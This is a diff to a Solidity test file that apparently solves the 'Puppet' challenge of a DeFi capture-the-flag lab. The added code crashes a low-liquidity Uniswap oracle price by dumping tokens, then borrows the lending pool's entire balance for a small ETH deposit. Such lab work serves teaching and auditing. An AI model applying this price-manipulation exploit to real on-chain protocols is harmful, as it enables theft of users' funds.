@@ -23,6 +23,12 @@ interface UniswapV1Exchange {
         external
         view
         returns (uint256);
+
+    function tokenToEthSwapInput(
+        uint256 tokens_sold,
+        uint256 min_eth,
+        uint256 deadline
+    ) external returns (uint256 eth_bought);
 }
 
 interface UniswapV1Factory {
@@ -119,6 +125,24 @@ contract Puppet is DSTest, stdCheats {
     function testExploit() public {
         /** EXPLOIT START **/
 
+        // The essence of the exploit is in Oracle manipulation. Since the PuppetPool
+        // use Uniswap pair with low liquidity swapping some DVT to ETH is enough
+        // to crash the price.
+        vm.startPrank(attacker);
+
+        dvt.approve(address(uniswapExchange), ATTACKER_INITIAL_TOKEN_BALANCE);
+        uniswapExchange.tokenToEthSwapInput(
+            ATTACKER_INITIAL_TOKEN_BALANCE,
+            1,
+            block.timestamp
+        );
+
+        uint256 amountEthRequired = puppetPool.calculateDepositRequired(
+            POOL_INITIAL_TOKEN_BALANCE
+        );
+        puppetPool.borrow{value: amountEthRequired}(POOL_INITIAL_TOKEN_BALANCE);
+
+        vm.stopPrank();
         /** EXPLOIT END **/
         validation();
     }
